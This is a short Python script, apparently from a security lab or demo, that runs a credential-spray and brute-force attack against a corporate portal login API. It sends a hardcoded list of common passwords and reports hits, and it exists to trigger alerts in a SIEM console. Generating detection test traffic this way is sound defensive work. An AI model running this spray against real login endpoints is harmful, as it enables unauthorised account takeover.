#!/usr/bin/env python3
"""
Corporate Portal Brute-Force & Credential Stuffing Simulation Script
Executes automated credential spray against the Corporate Portal API.
"""

import time
import requests
from colorama import init, Fore, Style

init(autoreset=True)

TARGET_URL = "http://backend:5000/api/corporate/auth/login"

WORDLIST = [
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "welcome2026"),
    ("admin", "letmein"),
    ("j.doe", "Summer2026!"),
    ("security_analyst", "hunter2"),
    ("admin", "SecureP@ssw0rd")  # Valid demo password
]

def run_bruteforce():
    print(f"{Fore.CYAN}[*] Starting Brute Force & Credential Spray against Corporate Portal...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Target: {TARGET_URL}{Style.RESET_ALL}\n")

    for index, (username, password) in enumerate(WORDLIST, 1):
        payload = {"username": username, "password": password}
        try:
            start_time = time.time()
            response = requests.post(TARGET_URL, json=payload, timeout=5)
            duration_ms = round((time.time() - start_time) * 1000, 1)

            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Attempt #{index}: SUCCESS! Valid credentials found -> {username}:{password} ({response.status_code} OK, {duration_ms}ms){Style.RESET_ALL}")
            elif response.status_code == 401:
                print(f"{Fore.RED}[-] Attempt #{index}: REJECTED -> {username}:{password} ({response.status_code} Unauthorized, {duration_ms}ms){Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[?] Attempt #{index}: Response -> {username}:{password} (Status: {response.status_code}){Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Connection error on attempt #{index}: {e}{Style.RESET_ALL}")

        time.sleep(0.8)

    print(f"\n{Fore.CYAN}[✓] Brute force simulation sequence finished. Check SIEM Ops Console for generated alerts!{Style.RESET_ALL}")

if __name__ == "__main__":
    run_bruteforce()
